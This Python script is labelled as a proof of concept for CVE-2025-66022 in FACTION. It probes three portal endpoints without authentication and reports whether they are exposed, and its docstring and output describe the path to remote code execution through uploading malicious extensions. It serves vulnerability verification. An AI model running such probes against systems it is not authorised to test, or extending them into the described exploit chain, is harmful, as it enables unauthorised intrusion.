#!/usr/bin/env python3
"""
CVE-2025-66022 PoC
FACTION Unauthenticated Access to Extension Management Leading to RCE

This PoC demonstrates:
1. Unauthenticated access to /portal/AppStoreDashboard (CWE-862)
2. Unauthenticated access to extension upload functionality
3. The ability to upload malicious extensions that can execute code when lifecycle hooks are triggered

Vulnerability: When FACTION_APPSTORE_ENABLED is not set to "true", the authentication
check is bypassed due to flawed logic in the authorization method.
"""

import requests
import sys
import argparse


def check_unauthenticated_access(target_url):
    """Check if AppStoreDashboard is accessible without authentication"""
    endpoints = [
        "/portal/AppStoreDashboard",
        "/portal/InstallExtension",
        "/portal/GetApps",
    ]
    
    results = []
    for endpoint in endpoints:
        url = f"{target_url.rstrip('/')}{endpoint}"
        try:
            resp = requests.get(url, timeout=10, allow_redirects=False)
            if resp.status_code == 200:
                results.append((endpoint, True, resp.status_code))
            elif resp.status_code == 302:
                location = resp.headers.get('Location', '')
                if 'login' in location.lower():
                    results.append((endpoint, False, f"302 -> {location}"))
                else:
                    results.append((endpoint, True, f"302 -> {location}"))
            else:
                results.append((endpoint, False, resp.status_code))
        except Exception as e:
            results.append((endpoint, False, str(e)))
    
    return results


def verify_vulnerability(target_url):
    """Main verification function"""
    print(f"[*] Target: {target_url}")
    print("[*] Checking unauthenticated access to App Store endpoints...\n")
    
    results = check_unauthenticated_access(target_url)
    vulnerable = False
    
    for endpoint, accessible, status in results:
        if accessible:
            print(f"[+] VULNERABLE: {endpoint} - Status: {status}")
            vulnerable = True
        else:
            print(f"[-] Protected: {endpoint} - Status: {status}")
    
    print()
    
    if vulnerable:
        print("[+] VULNERABILITY CONFIRMED: CVE-2025-66022")
        print("[+] The target is vulnerable to unauthenticated extension management access")
        print("[+] An attacker can upload malicious extensions without authentication")
        print("[+] When a lifecycle hook is triggered (e.g., report generation), RCE occurs")
        return True
    else:
        print("[-] Target does not appear to be vulnerable")
        print("[-] Authentication is properly enforced on App Store endpoints")
        return False


def main():
    parser = argparse.ArgumentParser(description='CVE-2025-66022 PoC - FACTION Unauthenticated RCE')
    parser.add_argument('target', help='Target URL (e.g., http://localhost:8088)')
    args = parser.parse_args()
    
    target = args.target
    if not target.startswith('http'):
        target = f'http://{target}'
    
    success = verify_vulnerability(target)
    sys.exit(0 if success else 1)


if __name__ == '__main__':
    main()
